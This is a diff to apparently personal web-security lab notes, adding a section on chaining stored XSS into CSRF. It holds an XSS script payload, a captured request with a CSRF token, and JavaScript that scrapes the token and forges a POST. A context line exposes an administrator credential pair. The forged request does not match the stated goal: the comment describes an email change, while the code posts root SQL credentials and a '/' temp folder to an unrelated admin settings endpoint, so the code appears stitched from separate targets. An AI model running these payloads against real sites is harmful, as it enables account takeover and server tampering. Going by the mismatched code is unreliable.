@@ -450,3 +450,59 @@ body:username.value+':'+this.value
 // this really worked:
 administrator:bjo7ffw73xe3wh0533g0
 ```
+
+### Exploiting XSS to perform CSRF
+```js
+// perform a CSRF attack and change the email address of someone who views the blog post comments
+// first capture the email-change request
+
+POST /my-account/change-email
+email=winny%40fake.com&csrf=lhIRE1kxkuExEzI6QZi73XnnjI1nHUF3
+
+// locate the XSS
+csrf=lhIRE1kxkuExEzI6QZi73XnnjI1nHUF3&postId=7&comment=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E&name=fake&email=fake%40fake.com&website=http%3A%2F%2Fasdf.asdf
+//<<-- xss fires
+
+// locate origin of the csrf token in the above POST request
+GET /post?postId=10 //note: doesn't matter what number is in the postId
+<input required type="hidden" name="csrf" value="bxaHxiZKDmsoxTfPUAkYvRTJJEjIxQ38">
+
+// make xhr for getting csrf token:
+var xhr = new XMLHttpRequest();
+var target = "/post?postId=10";
+xhr.open("GET",target,true);
+xhr.send(null);
+
+xhr.onreadystatechange = function() {
+	if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
+		//alert('changed');
+		csrf_token = this.response.split("\"csrf\" value=\"")[1].split("\">")[0];
+		alert(csrf_token)
+		//callback.apply(this,[csrf_token]);
+	}
+}
+// success
+
+// make the xhr, using the csrf token
+var xhr = new XMLHttpRequest();
+//alert(document.cookie);
+var target = "/index.php/admin/settings/globalsave";
+xhr.onreadystatechange = function() {
+	if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
+		//alert ('changed');
+	}
+}
+xhr.open("POST",target,true);
+
+var body = "save=1";
+body += "&fields%5Bsql_user%5D=root";
+body += "&fields%5Bsql_pass%5D=956ec84a45e0675851367c7e480ec0e9";
+body += "&fields%5BtmpFolderBaseName%5D=/";
+
+//var body = "save=1&fields%5Bsql_user%5D=root&fields%5Bsql_pass%5D=956ec84a45e0675851367c7e480ec0e9&fields%5BtmpFolderBaseName%5D=/";
+
+//xhr.withCredentials = true;
+xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded") //Content-Type matters!
+xhr.setRequestHeader("Content-Length",body.length);
+xhr.send(body);
+```
